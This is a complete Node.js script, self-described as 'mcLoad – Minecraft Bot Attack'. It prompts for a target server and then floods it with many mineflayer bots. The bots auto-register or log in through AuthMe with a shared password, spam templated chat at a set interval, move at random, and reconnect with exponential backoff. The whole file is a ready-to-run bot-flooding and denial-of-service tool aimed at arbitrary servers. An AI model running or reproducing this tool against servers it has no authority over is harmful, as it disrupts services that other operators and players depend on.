/**
 * mcLoad – Minecraft Bot Attack
 * Author: Sharlot Alzahri
 */

const mineflayer = require('mineflayer');
const readline = require('readline-sync');

console.log(`
=============================
   mcLoad - Minecraft Bot Attack
   Author: Sharlot Alzahri
=============================
`);

const serverIP = readline.question('Server IP: ');
const serverPort = readline.questionInt('Server Port: ');
const botCount = readline.questionInt('Number of bots: ');
const botPrefix = readline.question('Bot name prefix: ');
const joinDelay = readline.questionInt('Join delay per bot (ms): ');

const sendChat = readline.keyInYNStrict('Send chat messages? ');
const chatMessage = sendChat ? readline.question('Chat text (use {i} for bot number): ') : '';
const chatInterval = sendChat ? readline.questionInt('Chat interval (seconds): ') : 0;

const enableMove = readline.keyInYNStrict('Enable bot movement? ');

const useAuthMe = readline.keyInYNStrict('Use AuthMe register/login? ');
let authMode = null, authPass = '';
if (useAuthMe) {
    authMode = readline.keyInSelect(['register', 'login'], 'AuthMe mode:', { cancel: false }) === 0 ? 'register' : 'login';
    authPass = readline.question('AuthMe password (all bots): ', { hideEchoBack: true });
}

const autoVersion = readline.keyInYNStrict('Detect Minecraft version automatically? ');
const mcVersion = autoVersion ? false : readline.question('Exact version (e.g., 1.20.4): ');

const maxReconnect = readline.questionInt('Max reconnect attempts per bot: ');

let connected = 0, disconnected = 0, errors = 0;
const bots = new Map();

function log(...args) {
    console.log(new Date().toLocaleTimeString(), '-', ...args);
}

function spawnBot(index, attempt = 0) {
    const username = `${botPrefix}${index}`;
    const bot = mineflayer.createBot({
        host: serverIP,
        port: serverPort,
        username,
        version: mcVersion
    });

    bots.set(index, { bot, attempt, timers: [] });

    bot.once('login', () => {
        connected++;
        log(`[${index}] ${username} connected (connected=${connected})`);

        if (useAuthMe) {
            setTimeout(() => {
                try {
                    if (authMode === 'register') bot.chat(`/register ${authPass} ${authPass}`);
                    else bot.chat(`/login ${authPass}`);
                } catch {}
            }, 1200);
        }

        if (sendChat) {
            const say = () => {
                try { bot.chat(chatMessage.replaceAll('{i}', String(index))); } catch {}
            };
            say();
            const t = setInterval(say, chatInterval * 1000);
            bots.get(index).timers.push(t);
        }

        if (enableMove) {
            const moveLoop = () => {
                if (!bot.entity) return;
                try {
                    const yaw = Math.random() * 2 * Math.PI - Math.PI;
                    const pitch = Math.random() * 0.6 - 0.3;
                    bot.look(yaw, pitch, true);

                    bot.setControlState('forward', Math.random() < 0.6);
                    bot.setControlState('back', Math.random() < 0.1);
                    bot.setControlState('left', Math.random() < 0.4);
                    bot.setControlState('right', Math.random() < 0.3);
                    bot.setControlState('jump', Math.random() < 0.08);
                } catch {}
                const t = setTimeout(moveLoop, 1800 + Math.random() * 2500);
                bots.get(index).timers.push(t);
            };
            const onSpawn = () => setTimeout(moveLoop, 1500);
            bots.get(index).onSpawn = onSpawn;
            bot.on('spawn', onSpawn);
        }
    });

    bot.on('kicked', reason => log(`[${index}] Kicked: ${formatReason(reason)}`));

    bot.on('end', reason => {
        disconnected++;
        log(`[${index}] Disconnected (${formatReason(reason)}) (ended=${disconnected})`);
        cleanup(index);
        if (attempt < maxReconnect) {
            const backoff = Math.min(30000, 1000 * Math.pow(2, attempt));
            log(`[${index}] Reconnecting in ${backoff}ms (attempt ${attempt + 1}/${maxReconnect})`);
            setTimeout(() => spawnBot(index, attempt + 1), backoff);
        }
    });

    bot.on('error', err => {
        errors++;
        log(`[${index}] Error: ${err?.message || err}`);
    });
}

function cleanup(index) {
    const rec = bots.get(index);
    if (!rec) return;
    try {
        rec.timers.forEach(t => { clearTimeout(t); clearInterval(t); });
        if (rec.onSpawn && rec.bot) rec.bot.removeListener('spawn', rec.onSpawn);
        if (rec.bot) rec.bot.quit('cleanup');
    } catch {}
    bots.delete(index);
}

function formatReason(r) {
    try {
        if (typeof r === 'string') return r;
        if (r && r.text) return r.text;
        return JSON.stringify(r);
    } catch { return String(r); }
}

log('🚀 Starting mcLoad Bot Attack...');
for (let i = 1; i <= botCount; i++) {
    setTimeout(() => spawnBot(i), i * joinDelay);
}

setInterval(() => {
    log(`📊 Status: connected=${connected} | disconnected=${disconnected} | errors=${errors} | alive=${bots.size}`);
}, 10000);

process.on('SIGINT', () => {
    log('🛑 Stopping bots...');
    for (const i of Array.from(bots.keys())) cleanup(i);
    setTimeout(() => process.exit(0), 500);
});
